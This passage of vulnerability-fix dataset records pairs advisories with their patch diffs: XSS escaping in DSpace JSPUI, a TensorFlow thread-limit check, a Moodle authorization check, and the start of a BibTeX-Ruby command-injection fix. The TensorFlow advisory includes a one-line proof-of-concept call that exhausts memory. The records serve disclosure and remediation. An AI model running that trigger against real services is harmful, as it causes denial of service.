security@dspace.org","published_date":"2022-08-06","chain_len":4,"project":"https:\/\/github.com\/DSpace\/DSpace","commit_href":"https:\/\/github.com\/DSpace\/DSpace\/commit\/6f75bb084ab1937d094208c55cd84340040bcbb5","commit_sha":"6f75bb084ab1937d094208c55cd84340040bcbb5","patch":"MULTI","chain_ord":"['ebb83a75234d3de9be129464013e998dc929b68d', '35030a23e48b5946f5853332c797e1c4adea7bb7', 'c89e493e517b424dea6175caba54e91d3847fc3a', '6f75bb084ab1937d094208c55cd84340040bcbb5']","before_first_fix_commit":"{'d1dd7d23329ef055069759df15cfa200c8e32e54'}","last_fix_commit":"6f75bb084ab1937d094208c55cd84340040bcbb5","chain_ord_pos":4.0,"commit_datetime":"07\/26\/2022, 21:12:22","message":"[DS-4453] Discovery autocomplete HTML escaping (JSPUI)","author":"Kim Shepherd","comments":null,"stats":"{'additions': 7, 'deletions': 2, 'total': 9}","files":"{'dspace-jspui\/src\/main\/webapp\/search\/discovery.jsp': {'additions': 7, 'deletions': 2, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/DSpace\/DSpace\/raw\/6f75bb084ab1937d094208c55cd84340040bcbb5\/dspace-jspui%2Fsrc%2Fmain%2Fwebapp%2Fsearch%2Fdiscovery.jsp', 'patch': '@@ -141,7 +141,7 @@\\n \\t\\t\\t\\t\\t\\t\\t\\t\\ttmp_val = item.displayedValue;\\n \\t\\t\\t\\t\\t\\t\\t\\t}\\n \\t\\t\\t\\t\\t\\t\\t\\treturn {\\n-\\t\\t\\t\\t\\t\\t\\t\\t\\tlabel: item.displayedValue + \" (\" + item.count + \")\",\\n+\\t\\t\\t\\t\\t\\t\\t\\t\\tlabel: escapeHtml(item.displayedValue) + \" (\" + item.count + \")\",\\n \\t\\t\\t\\t\\t\\t\\t\\t\\tvalue: tmp_val\\n \\t\\t\\t\\t\\t\\t\\t\\t};\\n \\t\\t\\t\\t\\t\\t\\t}))\\t\\t\\t\\n@@ -153,7 +153,12 @@\\n \\tfunction validateFilters() {\\n \\t\\treturn document.getElementById(\"filterquery\").value.length > 0;\\n \\t}\\n-<\/script>\\t\\t\\n+\\t\/\/ Generic HTML escape utility\\n+\\tvar escapeHtml = s => (s + \\'\\').replace(\/[&<>\"\\']\/g, m => ({\\n+\\t\\t\\'&\\': \\'&amp;\\', \\'<\\': \\'&lt;\\', \\'>\\': \\'&gt;\\',\\n+\\t\\t\\'\"\\': \\'&quot;\\', \"\\'\": \\'&#39;\\'\\n+\\t})[m]);\\n+<\/script>\\n <\/c:set>\\n \\n <dspace:layout titlekey=\"jsp.search.title\">'}}","message_norm":"[ds-4453] discovery autocomplete html escaping (jspui)","language":"it","entities":"[('escaping', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['dspace-jspui\/src\/main\/webapp\/search\/discovery.jsp'])","num_files":1.0},{"index":1485,"vuln_id":"GHSA-c558-5gfm-p2r8","cwe_id":"{'CWE-79'}","score":7.1,"chain":"{'https:\/\/github.com\/DSpace\/DSpace\/commit\/6f75bb084ab1937d094208c55cd84340040bcbb5', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/ebb83a75234d3de9be129464013e998dc929b68d', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/35030a23e48b5946f5853332c797e1c4adea7bb7', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/c89e493e517b424dea6175caba54e91d3847fc3a'}","dataset":"osv","summary":"JSPUI spellcheck and autocomplete tools vulnerable to Cross Site Scripting ### Impact\nThe JSPUI spellcheck \"Did you mean\" HTML escapes the data-spell attribute in the link, but not the actual displayed text.  Similarly, the JSPUI autocomplete HTML does not properly escape text passed to it. Both are vulnerable to XSS.  This vulnerability only impacts the JSPUI.\n\n_This vulnerability does NOT impact the XMLUI or 7.x._\n\n### Patches\n_DSpace 6.x:_\n* Fixed in 6.4 via two commits: \n    * Fix for spellcheck: https:\/\/github.com\/DSpace\/DSpace\/commit\/ebb83a75234d3de9be129464013e998dc929b68d\n    * Fix for autocomplete: https:\/\/github.com\/DSpace\/DSpace\/commit\/35030a23e48b5946f5853332c797e1c4adea7bb7\n* 6.x patch files available (may be applied manually if an immediate upgrade to 6.4 or above is not possible)\n    * Fix for spellcheck: https:\/\/github.com\/DSpace\/DSpace\/commit\/ebb83a75234d3de9be129464013e998dc929b68d.patch\n    * Fix for autocomplete: https:\/\/github.com\/DSpace\/DSpace\/commit\/35030a23e48b5946f5853332c797e1c4adea7bb7.patch\n\n_DSpace 5.x:_\n* Fixed in 5.11 via two commits: \n    * Fix for spellcheck: https:\/\/github.com\/DSpace\/DSpace\/commit\/c89e493e517b424dea6175caba54e91d3847fc3a\n    * Fix for autocomplete: https:\/\/github.com\/DSpace\/DSpace\/commit\/6f75bb084ab1937d094208c55cd84340040bcbb5\n* 5.x patch files available (may be applied manually if an immediate upgrade to 5.11 or 6.4 is not possible)\n    * Fix for spellcheck: https:\/\/github.com\/DSpace\/DSpace\/commit\/c89e493e517b424dea6175caba54e91d3847fc3a.patch\n    * Fix for autocomplete: https:\/\/github.com\/DSpace\/DSpace\/commit\/6f75bb084ab1937d094208c55cd84340040bcbb5.patch\n\n#### Apply the patch to your DSpace\nIf at all possible, we recommend upgrading your DSpace site based on the upgrade instructions. However, if you are unable to do so, you can manually apply the above patches as follows:\n1. Download the appropriate patch file to the machine where DSpace is running\n2. From the `[dspace-src]` folder, apply the patch, e.g. `git apply [name-of-file].patch`\n3. Now, update your DSpace site (based loosely on the Upgrade instructions). This generally involves three steps:\n    1. Rebuild DSpace, e.g. `mvn -U clean package`  (This will recompile all DSpace code)\n    2. Redeploy DSpace, e.g. `ant update`  (This will copy all updated WARs \/ configs to your installation directory). Depending on your setup you also may need to copy the updated WARs over to your Tomcat webapps folder.\n    3. Restart Tomcat\n\n### References\nDiscovered & reported by Hassan Bhuiyan (Brunel University London)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@dspace.org","published_date":"2022-08-06","chain_len":4,"project":"https:\/\/github.com\/DSpace\/DSpace","commit_href":"https:\/\/github.com\/DSpace\/DSpace\/commit\/ebb83a75234d3de9be129464013e998dc929b68d","commit_sha":"ebb83a75234d3de9be129464013e998dc929b68d","patch":"MULTI","chain_ord":"['ebb83a75234d3de9be129464013e998dc929b68d', '35030a23e48b5946f5853332c797e1c4adea7bb7', 'c89e493e517b424dea6175caba54e91d3847fc3a', '6f75bb084ab1937d094208c55cd84340040bcbb5']","before_first_fix_commit":"{'d1dd7d23329ef055069759df15cfa200c8e32e54'}","last_fix_commit":"6f75bb084ab1937d094208c55cd84340040bcbb5","chain_ord_pos":1.0,"commit_datetime":"04\/08\/2020, 00:55:36","message":"[DS-4453] Fix XSS handling in JSPUI discovery spellcheck","author":"Kim Shepherd","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'dspace-jspui\/src\/main\/webapp\/search\/discovery.jsp': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/DSpace\/DSpace\/raw\/ebb83a75234d3de9be129464013e998dc929b68d\/dspace-jspui%2Fsrc%2Fmain%2Fwebapp%2Fsearch%2Fdiscovery.jsp', 'patch': '@@ -209,7 +209,7 @@\\n         <input type=\"text\" size=\"50\" id=\"query\" name=\"query\" value=\"<%= (query==null ? \"\" : Utils.addEntities(query)) %>\"\/>\\n         <input type=\"submit\" id=\"main-query-submit\" class=\"btn btn-primary\" value=\"<fmt:message key=\"jsp.general.go\"\/>\" \/>\\n <% if (StringUtils.isNotBlank(spellCheckQuery)) {%>\\n-\\t<p class=\"lead\"><fmt:message key=\"jsp.search.didyoumean\"><fmt:param><a id=\"spellCheckQuery\" data-spell=\"<%= Utils.addEntities(spellCheckQuery) %>\" href=\"#\"><%= spellCheckQuery %><\/a><\/fmt:param><\/fmt:message><\/p>\\n+\\t<p class=\"lead\"><fmt:message key=\"jsp.search.didyoumean\"><fmt:param><a id=\"spellCheckQuery\" data-spell=\"<%= Utils.addEntities(spellCheckQuery) %>\" href=\"#\"><%= Utils.addEntities(spellCheckQuery) %><\/a><\/fmt:param><\/fmt:message><\/p>\\n <% } %>                  \\n         <input type=\"hidden\" value=\"<%= rpp %>\" name=\"rpp\" \/>\\n         <input type=\"hidden\" value=\"<%= Utils.addEntities(sortedBy) %>\" name=\"sort_by\" \/>'}}","message_norm":"[ds-4453] fix xss handling in jspui discovery spellcheck","language":"en","entities":"[('fix', 'ACTION', ''), ('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['dspace-jspui\/src\/main\/webapp\/search\/discovery.jsp'])","num_files":1.0},{"index":1486,"vuln_id":"GHSA-c558-5gfm-p2r8","cwe_id":"{'CWE-79'}","score":7.1,"chain":"{'https:\/\/github.com\/DSpace\/DSpace\/commit\/6f75bb084ab1937d094208c55cd84340040bcbb5', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/ebb83a75234d3de9be129464013e998dc929b68d', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/35030a23e48b5946f5853332c797e1c4adea7bb7', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/c89e493e517b424dea6175caba54e91d3847fc3a'}","dataset":"osv","summary":"JSPUI spellcheck and autocomplete tools vulnerable to Cross Site Scripting ### Impact\nThe JSPUI spellcheck \"Did you mean\" HTML escapes the data-spell attribute in the link, but not the actual displayed text.  Similarly, the JSPUI autocomplete HTML does not properly escape text passed to it. Both are vulnerable to XSS.  This vulnerability only impacts the JSPUI.\n\n_This vulnerability does NOT impact the XMLUI or 7.x._\n\n### Patches\n_DSpace 6.x:_\n* Fixed in 6.4 via two commits: \n    * Fix for spellcheck: https:\/\/github.com\/DSpace\/DSpace\/commit\/ebb83a75234d3de9be129464013e998dc929b68d\n    * Fix for autocomplete: https:\/\/github.com\/DSpace\/DSpace\/commit\/35030a23e48b5946f5853332c797e1c4adea7bb7\n* 6.x patch files available (may be applied manually if an immediate upgrade to 6.4 or above is not possible)\n    * Fix for spellcheck: https:\/\/github.com\/DSpace\/DSpace\/commit\/ebb83a75234d3de9be129464013e998dc929b68d.patch\n    * Fix for autocomplete: https:\/\/github.com\/DSpace\/DSpace\/commit\/35030a23e48b5946f5853332c797e1c4adea7bb7.patch\n\n_DSpace 5.x:_\n* Fixed in 5.11 via two commits: \n    * Fix for spellcheck: https:\/\/github.com\/DSpace\/DSpace\/commit\/c89e493e517b424dea6175caba54e91d3847fc3a\n    * Fix for autocomplete: https:\/\/github.com\/DSpace\/DSpace\/commit\/6f75bb084ab1937d094208c55cd84340040bcbb5\n* 5.x patch files available (may be applied manually if an immediate upgrade to 5.11 or 6.4 is not possible)\n    * Fix for spellcheck: https:\/\/github.com\/DSpace\/DSpace\/commit\/c89e493e517b424dea6175caba54e91d3847fc3a.patch\n    * Fix for autocomplete: https:\/\/github.com\/DSpace\/DSpace\/commit\/6f75bb084ab1937d094208c55cd84340040bcbb5.patch\n\n#### Apply the patch to your DSpace\nIf at all possible, we recommend upgrading your DSpace site based on the upgrade instructions. However, if you are unable to do so, you can manually apply the above patches as follows:\n1. Download the appropriate patch file to the machine where DSpace is running\n2. From the `[dspace-src]` folder, apply the patch, e.g. `git apply [name-of-file].patch`\n3. Now, update your DSpace site (based loosely on the Upgrade instructions). This generally involves three steps:\n    1. Rebuild DSpace, e.g. `mvn -U clean package`  (This will recompile all DSpace code)\n    2. Redeploy DSpace, e.g. `ant update`  (This will copy all updated WARs \/ configs to your installation directory). Depending on your setup you also may need to copy the updated WARs over to your Tomcat webapps folder.\n    3. Restart Tomcat\n\n### References\nDiscovered & reported by Hassan Bhuiyan (Brunel University London)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@dspace.org","published_date":"2022-08-06","chain_len":4,"project":"https:\/\/github.com\/DSpace\/DSpace","commit_href":"https:\/\/github.com\/DSpace\/DSpace\/commit\/35030a23e48b5946f5853332c797e1c4adea7bb7","commit_sha":"35030a23e48b5946f5853332c797e1c4adea7bb7","patch":"MULTI","chain_ord":"['ebb83a75234d3de9be129464013e998dc929b68d', '35030a23e48b5946f5853332c797e1c4adea7bb7', 'c89e493e517b424dea6175caba54e91d3847fc3a', '6f75bb084ab1937d094208c55cd84340040bcbb5']","before_first_fix_commit":"{'d1dd7d23329ef055069759df15cfa200c8e32e54'}","last_fix_commit":"6f75bb084ab1937d094208c55cd84340040bcbb5","chain_ord_pos":2.0,"commit_datetime":"04\/08\/2020, 01:19:14","message":"[DS-4453] Fix XSS handling in JSPUI discovery autocomplete","author":"Kim Shepherd","comments":null,"stats":"{'additions': 6, 'deletions': 1, 'total': 7}","files":"{'dspace-jspui\/src\/main\/webapp\/search\/discovery.jsp': {'additions': 6, 'deletions': 1, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/DSpace\/DSpace\/raw\/35030a23e48b5946f5853332c797e1c4adea7bb7\/dspace-jspui%2Fsrc%2Fmain%2Fwebapp%2Fsearch%2Fdiscovery.jsp', 'patch': '@@ -147,7 +147,7 @@\\n \\t\\t\\t\\t\\t\\t\\t\\t\\ttmp_val = item.displayedValue;\\n \\t\\t\\t\\t\\t\\t\\t\\t}\\n \\t\\t\\t\\t\\t\\t\\t\\treturn {\\n-\\t\\t\\t\\t\\t\\t\\t\\t\\tlabel: item.displayedValue + \" (\" + item.count + \")\",\\n+\\t\\t\\t\\t\\t\\t\\t\\t\\tlabel: escapeHtml(item.displayedValue) + \" (\" + item.count + \")\",\\n \\t\\t\\t\\t\\t\\t\\t\\t\\tvalue: tmp_val\\n \\t\\t\\t\\t\\t\\t\\t\\t};\\n \\t\\t\\t\\t\\t\\t\\t}))\\t\\t\\t\\n@@ -159,6 +159,11 @@\\n \\tfunction validateFilters() {\\n \\t\\treturn document.getElementById(\"filterquery\").value.length > 0;\\n \\t}\\n+\\t\/\/ Generic HTML escape utility\\n+\\tvar escapeHtml = s => (s + \\'\\').replace(\/[&<>\"\\']\/g, m => ({\\n+\\t\\t\\'&\\': \\'&amp;\\', \\'<\\': \\'&lt;\\', \\'>\\': \\'&gt;\\',\\n+\\t\\t\\'\"\\': \\'&quot;\\', \"\\'\": \\'&#39;\\'\\n+\\t})[m]);\\n <\/script>\\t\\t\\n <\/c:set>'}}","message_norm":"[ds-4453] fix xss handling in jspui discovery autocomplete","language":"en","entities":"[('fix', 'ACTION', ''), ('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['dspace-jspui\/src\/main\/webapp\/search\/discovery.jsp'])","num_files":1.0},{"index":1487,"vuln_id":"GHSA-c558-5gfm-p2r8","cwe_id":"{'CWE-79'}","score":7.1,"chain":"{'https:\/\/github.com\/DSpace\/DSpace\/commit\/6f75bb084ab1937d094208c55cd84340040bcbb5', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/ebb83a75234d3de9be129464013e998dc929b68d', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/35030a23e48b5946f5853332c797e1c4adea7bb7', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/c89e493e517b424dea6175caba54e91d3847fc3a'}","dataset":"osv","summary":"JSPUI spellcheck and autocomplete tools vulnerable to Cross Site Scripting ### Impact\nThe JSPUI spellcheck \"Did you mean\" HTML escapes the data-spell attribute in the link, but not the actual displayed text.  Similarly, the JSPUI autocomplete HTML does not properly escape text passed to it. Both are vulnerable to XSS.  This vulnerability only impacts the JSPUI.\n\n_This vulnerability does NOT impact the XMLUI or 7.x._\n\n### Patches\n_DSpace 6.x:_\n* Fixed in 6.4 via two commits: \n    * Fix for spellcheck: https:\/\/github.com\/DSpace\/DSpace\/commit\/ebb83a75234d3de9be129464013e998dc929b68d\n    * Fix for autocomplete: https:\/\/github.com\/DSpace\/DSpace\/commit\/35030a23e48b5946f5853332c797e1c4adea7bb7\n* 6.x patch files available (may be applied manually if an immediate upgrade to 6.4 or above is not possible)\n    * Fix for spellcheck: https:\/\/github.com\/DSpace\/DSpace\/commit\/ebb83a75234d3de9be129464013e998dc929b68d.patch\n    * Fix for autocomplete: https:\/\/github.com\/DSpace\/DSpace\/commit\/35030a23e48b5946f5853332c797e1c4adea7bb7.patch\n\n_DSpace 5.x:_\n* Fixed in 5.11 via two commits: \n    * Fix for spellcheck: https:\/\/github.com\/DSpace\/DSpace\/commit\/c89e493e517b424dea6175caba54e91d3847fc3a\n    * Fix for autocomplete: https:\/\/github.com\/DSpace\/DSpace\/commit\/6f75bb084ab1937d094208c55cd84340040bcbb5\n* 5.x patch files available (may be applied manually if an immediate upgrade to 5.11 or 6.4 is not possible)\n    * Fix for spellcheck: https:\/\/github.com\/DSpace\/DSpace\/commit\/c89e493e517b424dea6175caba54e91d3847fc3a.patch\n    * Fix for autocomplete: https:\/\/github.com\/DSpace\/DSpace\/commit\/6f75bb084ab1937d094208c55cd84340040bcbb5.patch\n\n#### Apply the patch to your DSpace\nIf at all possible, we recommend upgrading your DSpace site based on the upgrade instructions. However, if you are unable to do so, you can manually apply the above patches as follows:\n1. Download the appropriate patch file to the machine where DSpace is running\n2. From the `[dspace-src]` folder, apply the patch, e.g. `git apply [name-of-file].patch`\n3. Now, update your DSpace site (based loosely on the Upgrade instructions). This generally involves three steps:\n    1. Rebuild DSpace, e.g. `mvn -U clean package`  (This will recompile all DSpace code)\n    2. Redeploy DSpace, e.g. `ant update`  (This will copy all updated WARs \/ configs to your installation directory). Depending on your setup you also may need to copy the updated WARs over to your Tomcat webapps folder.\n    3. Restart Tomcat\n\n### References\nDiscovered & reported by Hassan Bhuiyan (Brunel University London)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@dspace.org","published_date":"2022-08-06","chain_len":4,"project":"https:\/\/github.com\/DSpace\/DSpace","commit_href":"https:\/\/github.com\/DSpace\/DSpace\/commit\/c89e493e517b424dea6175caba54e91d3847fc3a","commit_sha":"c89e493e517b424dea6175caba54e91d3847fc3a","patch":"MULTI","chain_ord":"['ebb83a75234d3de9be129464013e998dc929b68d', '35030a23e48b5946f5853332c797e1c4adea7bb7', 'c89e493e517b424dea6175caba54e91d3847fc3a', '6f75bb084ab1937d094208c55cd84340040bcbb5']","before_first_fix_commit":"{'d1dd7d23329ef055069759df15cfa200c8e32e54'}","last_fix_commit":"6f75bb084ab1937d094208c55cd84340040bcbb5","chain_ord_pos":3.0,"commit_datetime":"07\/26\/2022, 04:25:18","message":"[DS-4453] Escape spellcheck, autocomplete HTML (JSPUI)","author":"Kim Shepherd","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'dspace-jspui\/src\/main\/webapp\/search\/discovery.jsp': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/DSpace\/DSpace\/raw\/c89e493e517b424dea6175caba54e91d3847fc3a\/dspace-jspui%2Fsrc%2Fmain%2Fwebapp%2Fsearch%2Fdiscovery.jsp', 'patch': '@@ -196,7 +196,7 @@\\n                                 <input type=\"text\" size=\"50\" id=\"query\" name=\"query\" value=\"<%= (query==null ? \"\" : Utils.addEntities(query)) %>\"\/>\\n                                 <input type=\"submit\" id=\"main-query-submit\" class=\"btn btn-primary\" value=\"<fmt:message key=\"jsp.general.go\"\/>\" \/>\\n <% if (StringUtils.isNotBlank(spellCheckQuery)) {%>\\n-\\t<p class=\"lead\"><fmt:message key=\"jsp.search.didyoumean\"><fmt:param><a id=\"spellCheckQuery\" data-spell=\"<%= Utils.addEntities(spellCheckQuery) %>\" href=\"#\"><%= spellCheckQuery %><\/a><\/fmt:param><\/fmt:message><\/p>\\n+\\t<p class=\"lead\"><fmt:message key=\"jsp.search.didyoumean\"><fmt:param><a id=\"spellCheckQuery\" data-spell=\"<%= Utils.addEntities(spellCheckQuery) %>\" href=\"#\"><%=Utils.addEntities(spellCheckQuery) %><\/a><\/fmt:param><\/fmt:message><\/p>\\n <% } %>                  \\n                                 <input type=\"hidden\" value=\"<%= rpp %>\" name=\"rpp\" \/>\\n                                 <input type=\"hidden\" value=\"<%= Utils.addEntities(sortedBy) %>\" name=\"sort_by\" \/>'}}","message_norm":"[ds-4453] escape spellcheck, autocomplete html (jspui)","language":"fr","entities":"[('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['dspace-jspui\/src\/main\/webapp\/search\/discovery.jsp'])","num_files":1.0},{"index":1489,"vuln_id":"GHSA-c582-c96p-r5cq","cwe_id":"{'CWE-400', 'CWE-770'}","score":4.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e'}","dataset":"osv","summary":"Memory exhaustion in Tensorflow ### Impact \nThe [implementation of `ThreadPoolHandle`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/5100e359aef5c8021f2e71c7b986420b85ce7b3d\/tensorflow\/core\/kernels\/data\/experimental\/threadpool_dataset_op.cc#L79-L135) can be used to trigger a denial of service attack by allocating too much memory:\n\n```python\nimport tensorflow as tf\ny = tf.raw_ops.ThreadPoolHandle(num_threads=0x60000000,display_name='tf')\n```\n\nThis is because the `num_threads` argument is only checked to not be negative, but there is no upper bound on its value.\n    \n### Patches\nWe have patched the issue in GitHub commit [e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.","published_date":"2022-02-10","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e","commit_sha":"e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e","patch":"SINGLE","chain_ord":"['e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e']","before_first_fix_commit":"{'dc94fe9983e3deca817b7a081fa43c4e3b1ddec8'}","last_fix_commit":"e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e","chain_ord_pos":1.0,"commit_datetime":"11\/19\/2021, 00:10:34","message":"[tf.data] Set limit on number of threads used in threadpool_dataset.\n\nPiperOrigin-RevId: 410922677\nChange-Id: Ib25814a99043ab10805b5d2d7088ae0e0b7b04fd","author":"Andrew Audibert","comments":null,"stats":"{'additions': 19, 'deletions': 7, 'total': 26}","files":"{'tensorflow\/core\/kernels\/data\/experimental\/threadpool_dataset_op.cc': {'additions': 19, 'deletions': 7, 'changes': 26, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e\/tensorflow%2Fcore%2Fkernels%2Fdata%2Fexperimental%2Fthreadpool_dataset_op.cc', 'patch': '@@ -39,6 +39,22 @@ namespace experimental {\\n     PrivateThreadPoolDatasetOp::kDatasetType;\\n \/* static *\/ constexpr const char* const PrivateThreadPoolDatasetOp::kDatasetOp;\\n \\n+namespace {\\n+\/\/ To prevent integer overflow issues when allocating threadpool memory for an\\n+\/\/ unreasonable number of threads.\\n+constexpr int kThreadLimit = 65536;\\n+\\n+Status ValidateNumThreads(int32_t num_threads) {\\n+  if (num_threads < 0) {\\n+    return errors::InvalidArgument(\"`num_threads` must be >= 0\");\\n+  }\\n+  if (num_threads >= kThreadLimit) {\\n+    return errors::InvalidArgument(\"`num_threads` must be < \", kThreadLimit);\\n+  }\\n+  return Status::OK();\\n+}\\n+}  \/\/ namespace\\n+\\n class ThreadPoolResource : public ResourceBase {\\n  public:\\n   ThreadPoolResource(Env* env, const ThreadOptions& thread_options,\\n@@ -83,9 +99,7 @@ class ThreadPoolHandleOp : public OpKernel {\\n     OP_REQUIRES_OK(ctx, ctx->GetAttr(\"num_threads\", &num_threads_));\\n     OP_REQUIRES_OK(ctx, ctx->GetAttr(\"max_intra_op_parallelism\",\\n                                      &max_intra_op_parallelism_));\\n-    OP_REQUIRES(\\n-        ctx, num_threads_ > 0,\\n-        errors::InvalidArgument(\"`num_threads` must be greater than zero.\"));\\n+    OP_REQUIRES_OK(ctx, ValidateNumThreads(num_threads_));\\n   }\\n \\n   \/\/ The resource is deleted from the resource manager only when it is private\\n@@ -531,8 +545,7 @@ void PrivateThreadPoolDatasetOp::MakeDatasetFromOptions(OpKernelContext* ctx,\\n                                                         DatasetBase* input,\\n                                                         int32_t num_threads,\\n                                                         DatasetBase** output) {\\n-  OP_REQUIRES(ctx, num_threads >= 0,\\n-              errors::InvalidArgument(\"`num_threads` must be >= 0\"));\\n+  OP_REQUIRES_OK(ctx, ValidateNumThreads(num_threads));\\n   *output = new Dataset(ctx,\\n                         DatasetContext(DatasetContext::Params(\\n                             {PrivateThreadPoolDatasetOp::kDatasetType,\\n@@ -546,8 +559,7 @@ void PrivateThreadPoolDatasetOp::MakeDataset(OpKernelContext* ctx,\\n   int64_t num_threads = 0;\\n   OP_REQUIRES_OK(\\n       ctx, ParseScalarArgument<int64_t>(ctx, \"num_threads\", &num_threads));\\n-  OP_REQUIRES(ctx, num_threads >= 0,\\n-              errors::InvalidArgument(\"`num_threads` must be >= 0\"));\\n+  OP_REQUIRES_OK(ctx, ValidateNumThreads(num_threads));\\n   *output = new Dataset(ctx, input, num_threads);\\n }'}}","message_norm":"[tf.data] set limit on number of threads used in threadpool_dataset.\n\npiperorigin-revid: 410922677\nchange-id: ib25814a99043ab10805b5d2d7088ae0e0b7b04fd","language":"en","entities":"[('410922677', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/data\/experimental\/threadpool_dataset_op.cc'])","num_files":1.0},{"index":1491,"vuln_id":"GHSA-c5hf-mc85-2hx4","cwe_id":"{'CWE-863'}","score":4.3,"chain":"{'https:\/\/github.com\/moodle\/moodle\/commit\/cdc78a16a5da95a17fb10bf1c66689237f5a3f7d'}","dataset":"osv","summary":"Missing authorization in Moodle Users with the capability to configure badge criteria (teachers and managers by default) were able to configure course badges with profile field criteria, which should only be available for site badges.","published_date":"2022-04-30","chain_len":1,"project":"https:\/\/github.com\/moodle\/moodle","commit_href":"https:\/\/github.com\/moodle\/moodle\/commit\/cdc78a16a5da95a17fb10bf1c66689237f5a3f7d","commit_sha":"cdc78a16a5da95a17fb10bf1c66689237f5a3f7d","patch":"SINGLE","chain_ord":"['cdc78a16a5da95a17fb10bf1c66689237f5a3f7d']","before_first_fix_commit":"{'4c00836de97bea26a0c5ba6068a55a8c1b16f260'}","last_fix_commit":"cdc78a16a5da95a17fb10bf1c66689237f5a3f7d","chain_ord_pos":1.0,"commit_datetime":"03\/07\/2022, 12:39:16","message":"MDL-74075 core_badges: Check accepted criterias","author":"Amaia Anabitarte","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'badges\/criteria_settings.php': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/moodle\/moodle\/raw\/cdc78a16a5da95a17fb10bf1c66689237f5a3f7d\/badges%2Fcriteria_settings.php', 'patch': \"@@ -55,6 +55,12 @@\\n     redirect($return);\\n }\\n \\n+\/\/ Make sure the criteria type is accepted.\\n+$accepted = $badge->get_accepted_criteria();\\n+if (!in_array($type, $accepted)) {\\n+    redirect($return);\\n+}\\n+\\n if ($badge->type == BADGE_TYPE_COURSE) {\\n     require_login($badge->courseid);\\n     $navurl = new moodle_url('\/badges\/index.php', array('type' => $badge->type, 'id' => $badge->courseid));\"}}","message_norm":"mdl-74075 core_badges: check accepted criterias","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['badges\/criteria_settings.php'])","num_files":1.0},{"index":1492,"vuln_id":"GHSA-c5r5-7pfh-6qg6","cwe_id":"{'CWE-78'}","score":9.8,"chain":"{'https:\/\/github.com\/inukshuk\/bibtex-ruby\/commit\/14406f4460f4e1ecabd25ca94f809b3ea7c5fb11'}","dataset":"osv","summary":"OS command injection in BibTeX-Ruby BibTeX-ruby before 5.1.0 allows shell command injection due to unsanitized user input being passed directly to the built-in Ruby Kernel.open method through BibTeX.open.","published_date":"2020-02-14","chain_len":1,"project":"https:\/\/github.com\/inukshuk\/bibtex-ruby","commit_href":"https:\/\/github.com\/inukshuk\/bibtex-ruby\/commit\/14406f4460f4e1ecabd25ca94f809b3ea7c5fb11","commit_sha":"14406f4460f4e1ecabd25ca94f809b3ea7c5fb11","patch":"SINGLE","chain_ord":"['14406f4460f4e1ecabd25ca94f809b3ea7c5fb11']","before_first_fix_commit":"{'707b9303e4ed9a7e136dd1268e21d73d5faab817'}","last_fix_commit":"14406f4460f4e1ecabd25ca94f809b3ea7c5fb11","chain_ord_pos":1.0,"commit_datetime":"01\/17\/2020, 13:34:37","message":"Use File.read instead of Kernel.open\n\nTo avoid command injection with | strings","author":"Sylvester Keil","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/bibtex\/bibliography.rb': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/inukshuk\/bibtex-ruby\/raw\/14406f4460f4e1ecabd25ca94f809b3ea7c5fb11\/lib%2Fbibtex%2Fbibliography.rb', 'patch': \"@@ -47,7 +47,7 @@ class << self\\n       # -:filter: convert all 